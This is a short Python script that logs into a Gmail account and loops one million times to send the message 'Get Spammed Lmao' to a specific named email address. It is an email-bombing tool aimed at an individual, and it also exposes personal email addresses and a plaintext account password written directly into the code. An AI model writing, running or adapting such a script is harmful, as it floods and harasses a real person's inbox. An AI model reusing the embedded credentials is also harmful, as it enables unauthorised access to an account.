import smtplib
toaddrs = 'singhsandhya510@gmail.com'
fromaddrs = 'contact.how.to.tech.help@gmail.com'
message = 'Get Spammed Lmao'
with smtplib.SMTP('smtp.gmail.com', '587') as smtpserver:
  smtpserver.ehlo()
  smtpserver.starttls()
  smtpserver.ehlo()
  smtpserver.login('contact.how.to.tech.help@gmail.com', 'gcye rzlt rwky fnyy')
  for i in range(1000000):
    smtpserver.sendmail(fromaddrs, toaddrs, message)